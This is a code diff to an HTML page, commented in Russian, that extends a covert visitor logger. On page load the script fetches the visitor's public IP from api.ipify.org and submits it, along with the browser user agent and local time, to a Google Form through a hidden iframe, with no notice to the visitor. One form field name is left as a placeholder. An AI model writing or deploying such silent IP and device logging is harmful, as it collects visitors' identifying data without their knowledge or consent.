@@ -40,6 +40,7 @@
 
   <form id="sendForm" action="https://docs.google.com/forms/d/e/1FAIpQLSdl5lqvGofH1jMMMTi9S50FlRw-Q7Jx1cYaPMPULo9lkfxu1A/formResponse" method="POST" target="hiddenFrame">
     <input name="entry.206479093" id="combinedInput" type="text">
+    <input name="entry.XXXXXXX" id="ipInput" type="text"> <!-- Замените XXXXXX на правильное имя поля -->
   </form>
 
   <iframe name="hiddenFrame" style="display: none;" onload="document.getElementById('status').textContent = ''"></iframe>
@@ -48,14 +49,30 @@
     const userAgent = navigator.userAgent;
     const currentTime = new Date().toLocaleString();
     
-    // Объединяем информацию об устройстве и времени в одну строку
-    const combinedInfo = `${userAgent} | ${currentTime}`;
-    
-    // Заполняем поле формы
-    document.getElementById("combinedInput").value = combinedInfo;
+    // Функция для получения IP-адреса через API
+    function getIpAndSubmitForm() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
 
-    // Отправляем форму
-    document.getElementById('sendForm').submit();
+          // Объединяем информацию об устройстве и времени в одну строку
+          const combinedInfo = `${userAgent} | ${currentTime}`;
+
+          // Заполняем поля формы
+          document.getElementById("combinedInput").value = combinedInfo;
+          document.getElementById("ipInput").value = ipAddress;
+
+          // Отправляем форму
+          document.getElementById('sendForm').submit();
+        })
+        .catch(error => {
+          console.error('Ошибка при получении IP-адреса:', error);
+        });
+    }
+
+    // Запускаем функцию для получения IP и отправки формы
+    getIpAndSubmitForm();
   </script>
 </body>
 </html>
